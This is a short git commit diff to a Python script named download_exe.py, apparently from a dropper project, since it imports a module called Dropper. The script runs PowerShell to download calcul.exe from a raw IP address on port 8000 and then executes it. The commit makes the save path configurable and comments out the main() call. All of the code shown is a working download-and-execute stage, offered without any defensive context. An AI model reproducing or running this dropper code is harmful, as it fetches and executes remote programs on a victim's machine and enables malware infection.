9a2f0e54e0a0d2dad1861f5bb4a44e2e2c51d65d
Clement <48801402+Clement17-rouault@users.noreply.github.com>
2022-06-24 13:29:35 +0200

    Update download_exe.py

--- download_exe.py
+++ download_exe.py
@@ -1,12 +1,13 @@
 import os
+import Dropper
 
 def main():
     print(u"Ici va télécharger l'exe")
     try:
-        os.system("powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('http://54.90.113.98:8000/calcul.exe', 'C:\\Users\\Clément\\Desktop\\Test\\calcul.exe')")
-        os.popen("powershell.exe -Command Invoke-Item C:\\Users\\Clément\\Desktop\\Test\\calcul.exe")
+        os.system(f"powershell.exe -Command (New-Object System.Net.WebClient).DownloadFile('http://54.90.113.98:8000/calcul.exe', '{Dropper.save_path}\\calcul.exe')")
+        os.popen(f"powershell.exe -Command Invoke-Item {Dropper.save_path}\\calcul.exe")
         return True
     except:
         return False
 
-main()
+#main()
